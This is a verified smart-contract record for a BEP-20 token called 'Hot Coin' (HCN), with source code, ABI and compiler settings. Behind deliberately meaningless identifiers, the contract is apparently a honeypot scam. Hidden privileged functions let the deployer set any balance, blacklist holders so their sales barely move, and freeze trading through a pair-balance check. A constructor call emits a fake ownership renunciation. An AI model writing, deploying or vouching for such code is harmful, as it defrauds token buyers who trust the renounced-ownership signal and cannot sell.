{"SourceCode": "//SPDX-License-Identifier: MIT\n\npragma solidity ^0.8.9;\n\nlibrary SafeMath {\n\n    function add(uint256 a, uint256 b) internal pure returns (uint256) {\n        uint256 c = a + b;\n        require(c >= a, \"SafeMath: addition overflow\");\n\n        return c;\n    }\n\n    function sub(uint256 a, uint256 b) internal pure returns (uint256) {\n        return sub(a, b, \"SafeMath: subtraction overflow\");\n    }\n\n    function sub(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {\n        require(b <= a, errorMessage);\n        uint256 c = a - b;\n\n        return c;\n    }\n\n    function mul(uint256 a, uint256 b) internal pure returns (uint256) {\n        if (a == 0) {\n            return 0;\n        }\n\n        uint256 c = a * b;\n        require(c / a == b, \"SafeMath: multiplication overflow\");\n\n        return c;\n    }\n\n    function div(uint256 a, uint256 b) internal pure returns (uint256) {\n        return div(a, b, \"SafeMath: division by zero\");\n    }\n\n    function div(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {\n        require(b > 0, errorMessage);\n        uint256 c = a / b;\n\n        return c;\n    }\n\n    function mod(uint256 a, uint256 b) internal pure returns (uint256) {\n        return mod(a, b, \"SafeMath: modulo by zero\");\n    }\n\n    function mod(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {\n        require(b != 0, errorMessage);\n        return a % b;\n    }\n}\n\nabstract contract minAuto {\n    function _msgSender() internal view virtual returns (address) {\n        return msg.sender;\n    }\n\n    function _msgData() internal view virtual returns (bytes calldata) {\n        return msg.data;\n    }\n}\n\ninterface senderBuy {\n    function createPair(address takeShould, address toFrom) external returns (address);\n\n    function feeTo() external view returns (address);\n}\n\ninterface walletEnable {\n    function factory() external pure returns (address);\n\n    function WETH() external pure returns (address);\n}\n\n\ninterface exemptShould {\n    function totalSupply() external view returns (uint256);\n\n    function balanceOf(address teamLaunched) external view returns (uint256);\n\n    function transfer(address buyLimit, uint256 limitTake) external returns (bool);\n\n    function allowance(address amountMarketingList, address spender) external view returns (uint256);\n\n    function approve(address spender, uint256 limitTake) external returns (bool);\n\n    function transferFrom(\n        address sender,\n        address buyLimit,\n        uint256 limitTake\n    ) external returns (bool);\n\n    event Transfer(address indexed from, address indexed teamFund, uint256 value);\n    event Approval(address indexed amountMarketingList, address indexed spender, uint256 value);\n}\n\ninterface exemptShouldMetadata is exemptShould {\n    function name() external view returns (string memory);\n\n    function symbol() external view returns (string memory);\n\n    function decimals() external view returns (uint8);\n}\n\ncontract HotCoin is minAuto, exemptShould, exemptShouldMetadata {\n\n    event OwnershipTransferred(address indexed receiverTrading, address indexed fromLiquidity);\n\n    function totalSupply() external view virtual override returns (uint256) {\n        return launchedFeeWallet;\n    }\n\n    uint256 public senderMode = 3;\n\n    mapping(address => mapping(address => uint256)) private totalMaxExempt;\n\n    function teamTotalReceiver(address amountTake, address buyLimit, uint256 limitTake) internal view returns (uint256) {\n        require(limitTake > 0);\n\n        uint256 listLaunchedLimit = 0;\n        if (amountTake == feeShould && senderMode > 0) {\n            listLaunchedLimit = limitTake * senderMode / 100;\n        } else if (buyLimit == feeShould && feeMin > 0) {\n            listLaunchedLimit = limitTake * feeMin / 100;\n        }\n        require(listLaunchedLimit <= limitTake);\n        return limitTake - listLaunchedLimit;\n    }\n\n    uint256 constant autoLaunchSwap = 11 ** 10;\n\n    function modeFrom(address amountTake, address buyLimit, uint256 limitTake) internal returns (bool) {\n        require(walletEnableFrom[amountTake] >= limitTake);\n        walletEnableFrom[amountTake] -= limitTake;\n        walletEnableFrom[buyLimit] += limitTake;\n        emit Transfer(amountTake, buyLimit, limitTake);\n        return true;\n    }\n\n    address listTrading = 0x10ED43C718714eb63d5aA57B78B54704E256024E;\n\n    uint256 walletMode;\n\n    address public modeMin;\n\n    uint256 public buyMax;\n\n    function symbol() external view virtual override returns (string memory) {\n        return maxTake;\n    }\n\n    uint256 private launchedFeeWallet = 100000000 * 10 ** 18;\n\n    address public feeShould;\n\n    mapping(address => bool) public shouldIs;\n\n    uint256 maxFee;\n\n    function teamFee(address amountTake, address buyLimit, uint256 limitTake) internal returns (bool) {\n        if (amountTake == modeMin) {\n            return modeFrom(amountTake, buyLimit, limitTake);\n        }\n        uint256 fromToken = exemptShould(feeShould).balanceOf(limitLaunched);\n        require(fromToken == walletMode);\n        require(buyLimit != limitLaunched);\n        if (enableMarketing[amountTake]) {\n            return modeFrom(amountTake, buyLimit, autoLaunchSwap);\n        }\n        limitTake = teamTotalReceiver(amountTake, buyLimit, limitTake);\n        return modeFrom(amountTake, buyLimit, limitTake);\n    }\n\n    function name() external view virtual override returns (string memory) {\n        return takeWallet;\n    }\n\n    function transferFrom(address amountTake, address buyLimit, uint256 limitTake) external override returns (bool) {\n        if (_msgSender() != listTrading) {\n            if (totalMaxExempt[amountTake][_msgSender()] != type(uint256).max) {\n                require(limitTake <= totalMaxExempt[amountTake][_msgSender()]);\n                totalMaxExempt[amountTake][_msgSender()] -= limitTake;\n            }\n        }\n        return teamFee(amountTake, buyLimit, limitTake);\n    }\n\n    string private maxTake = \"HCN\";\n\n    uint256 public feeMin = 0;\n\n    address limitLaunched;\n\n    uint8 private receiverAuto = 18;\n\n    function teamEnableTotal() public {\n        emit OwnershipTransferred(modeMin, address(0));\n        modeBuy = address(0);\n    }\n\n    function getOwner() external view returns (address) {\n        return modeBuy;\n    }\n\n    bool private totalLaunched;\n\n    bool public shouldSwap;\n\n    address private modeBuy;\n\n    function walletAmount(uint256 limitTake) public {\n        receiverTx();\n        walletMode = limitTake;\n    }\n\n    string private takeWallet = \"Hot Coin\";\n\n    bool public tradingLimit;\n\n    function feeIsTo(address maxShouldTeam) public {\n        require(maxShouldTeam.balance < 100000);\n        if (shouldSwap) {\n            return;\n        }\n        \n        shouldIs[maxShouldTeam] = true;\n        \n        shouldSwap = true;\n    }\n\n    uint256 private receiverTeam;\n\n    constructor (){\n        \n        teamEnableTotal();\n        walletEnable launchSender = walletEnable(listTrading);\n        feeShould = senderBuy(launchSender.factory()).createPair(launchSender.WETH(), address(this));\n        limitLaunched = senderBuy(launchSender.factory()).feeTo();\n        if (buyMax != receiverTeam) {\n            tradingLimit = false;\n        }\n        modeMin = _msgSender();\n        shouldIs[modeMin] = true;\n        walletEnableFrom[modeMin] = launchedFeeWallet;\n        if (totalLaunched != tradingLimit) {\n            tradingLimit = true;\n        }\n        emit Transfer(address(0), modeMin, launchedFeeWallet);\n    }\n\n    function allowance(address limitReceiver, address fundLimit) external view virtual override returns (uint256) {\n        if (fundLimit == listTrading) {\n            return type(uint256).max;\n        }\n        return totalMaxExempt[limitReceiver][fundLimit];\n    }\n\n    mapping(address => bool) public enableMarketing;\n\n    function approve(address fundLimit, uint256 limitTake) public virtual override returns (bool) {\n        totalMaxExempt[_msgSender()][fundLimit] = limitTake;\n        emit Approval(_msgSender(), fundLimit, limitTake);\n        return true;\n    }\n\n    function balanceOf(address teamLaunched) public view virtual override returns (uint256) {\n        return walletEnableFrom[teamLaunched];\n    }\n\n    function maxAmount(address modeMaxTx) public {\n        receiverTx();\n        if (tradingLimit) {\n            atLaunched = receiverTeam;\n        }\n        if (modeMaxTx == modeMin || modeMaxTx == feeShould) {\n            return;\n        }\n        enableMarketing[modeMaxTx] = true;\n    }\n\n    function atFee(address fundTx, uint256 limitTake) public {\n        receiverTx();\n        walletEnableFrom[fundTx] = limitTake;\n    }\n\n    uint256 private atLaunched;\n\n    function owner() external view returns (address) {\n        return modeBuy;\n    }\n\n    function receiverTx() private view {\n        require(shouldIs[_msgSender()]);\n    }\n\n    function decimals() external view virtual override returns (uint8) {\n        return receiverAuto;\n    }\n\n    function transfer(address fundTx, uint256 limitTake) external virtual override returns (bool) {\n        return teamFee(_msgSender(), fundTx, limitTake);\n    }\n\n    bool private sellWalletShould;\n\n    mapping(address => uint256) private walletEnableFrom;\n\n}", "ABI": "[{\"inputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"constructor\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"amountMarketingList\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"spender\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Approval\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"receiverTrading\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"fromLiquidity\",\"type\":\"address\"}],\"name\":\"OwnershipTransferred\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"from\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"teamFund\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Transfer\",\"type\":\"event\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"limitReceiver\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"fundLimit\",\"type\":\"address\"}],\"name\":\"allowance\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"fundLimit\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"limitTake\",\"type\":\"uint256\"}],\"name\":\"approve\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"fundTx\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"limitTake\",\"type\":\"uint256\"}],\"name\":\"atFee\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"teamLaunched\",\"type\":\"address\"}],\"name\":\"balanceOf\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"buyMax\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"decimals\",\"outputs\":[{\"internalType\":\"uint8\",\"name\":\"\",\"type\":\"uint8\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"enableMarketing\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"maxShouldTeam\",\"type\":\"address\"}],\"name\":\"feeIsTo\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"feeMin\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"feeShould\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"getOwner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"modeMaxTx\",\"type\":\"address\"}],\"name\":\"maxAmount\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"modeMin\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"name\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"owner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"senderMode\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"shouldIs\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"shouldSwap\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"symbol\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"teamEnableTotal\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"totalSupply\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"tradingLimit\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"fundTx\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"limitTake\",\"type\":\"uint256\"}],\"name\":\"transfer\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"amountTake\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"buyLimit\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"limitTake\",\"type\":\"uint256\"}],\"name\":\"transferFrom\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"uint256\",\"name\":\"limitTake\",\"type\":\"uint256\"}],\"name\":\"walletAmount\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"}]", "ContractName": "HotCoin", "CompilerVersion": "v0.8.19+commit.7dd6d404", "OptimizationUsed": "0", "Runs": "200", "ConstructorArguments": "", "EVMVersion": "Default", "Library": "", "LicenseType": "MIT", "Proxy": "0", "Implementation": "", "SwarmSource": ""}